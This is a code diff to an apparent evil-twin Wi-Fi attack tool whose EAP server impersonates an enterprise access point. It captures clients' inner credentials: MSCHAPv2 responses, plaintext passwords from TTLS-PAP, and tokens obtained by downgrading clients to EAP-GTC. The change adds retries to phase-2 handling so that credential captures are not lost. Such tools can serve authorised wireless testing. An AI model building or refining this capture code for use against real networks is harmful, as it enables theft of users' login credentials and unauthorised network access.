@@ -31,6 +31,7 @@ from wifit3.campaigns.eviltwin_enterprise.tls import TlsTunnel, server_context
 logger = logging.getLogger(__name__)
 
 MAX_TLS_FRAGMENT = 1024
+_MAX_PHASE2_RETRIES = 4           # re-request the inner identity this many times before giving up
 
 
 class Method(str, Enum):
@@ -79,6 +80,7 @@ class EapServer:
         self.inner_username: str = ""
         self._auth_challenge = b""
         self._offered_gtc = gtc_downgrade
+        self._phase2_retries = 0
         self.captured: Optional[Capture] = None
 
     @property
@@ -181,20 +183,33 @@ class EapServer:
             return self._handle_ttls_pap(plaintext)
         inner = parse_eap(plaintext)
         if inner is None:
-            self.on_event("phase 2: could not parse the inner EAP packet")
-            return self._finish()
-        if inner.code == EAP_RESPONSE and inner.method_type == EAP_TYPE_IDENTITY:
+            return self._retry_or_finish("inner is not a parseable EAP packet", plaintext)
+        if inner.code != EAP_RESPONSE:
+            return self._retry_or_finish(f"inner EAP code {inner.code} is not a Response", plaintext)
+        self._phase2_retries = 0                      # a real inner Response: we're on track
+        if inner.method_type == EAP_TYPE_IDENTITY:
             self.inner_username = inner.data.decode("utf-8", errors="replace").strip("\x00")
             self.on_event(f"inner identity = {self.inner_username or '<empty>'}")
             return self._send_inner_challenge()
-        if inner.code == EAP_RESPONSE and inner.method_type == EAP_TYPE_NAK:
+        if inner.method_type == EAP_TYPE_NAK:
             return self._on_inner_nak(inner)
-        if inner.code == EAP_RESPONSE and inner.method_type == EAP_TYPE_MSCHAPV2:
+        if inner.method_type == EAP_TYPE_MSCHAPV2:
             return self._capture_mschapv2(inner.data)
-        if inner.code == EAP_RESPONSE and inner.method_type == EAP_TYPE_GTC:
+        if inner.method_type == EAP_TYPE_GTC:
             return self._capture_gtc(inner.data)
-        self.on_event(f"phase 2: unhandled inner EAP type {inner.method_type}")
-        return self._finish()
+        return self._retry_or_finish(f"unhandled inner EAP type {inner.method_type}", plaintext)
+
+    def _retry_or_finish(self, reason: str, plaintext: bytes) -> list[bytes]:
+        """A phase-2 message we can't use. Rather than give up (the old behaviour, which aborted the
+        whole login), re-send the inner identity request a few times: a client that was waiting for
+        us then answers. The hex is logged so a genuinely unexpected inner format can be fixed."""
+        self._phase2_retries += 1
+        preview = plaintext[:24].hex() if plaintext else "empty"
+        if self._phase2_retries > _MAX_PHASE2_RETRIES:
+            self.on_event(f"phase 2: {reason} ({preview}); giving up after {_MAX_PHASE2_RETRIES} tries")
+            return self._finish()
+        self.on_event(f"phase 2: {reason} ({preview}); re-requesting inner identity")
+        return self._begin_phase2()
 
     def _send_inner_challenge(self) -> list[bytes]:
         self.on_event(f"offering inner {'EAP-GTC (downgrade)' if self._offered_gtc else 'MSCHAPv2'}")
@@ -242,7 +257,8 @@ class EapServer:
     def _handle_ttls_pap(self, plaintext: bytes) -> list[bytes]:
         creds = _parse_pap_avps(plaintext)
         if creds is None:
-            return self._finish()
+            return self._retry_or_finish("TTLS inner is not PAP (User-Name/Password AVPs)", plaintext)
+        self._phase2_retries = 0
         username, password = creds
         self.inner_username = username
         self.captured = Capture(ssid=self.ssid, username=username, inner_method="PAP",
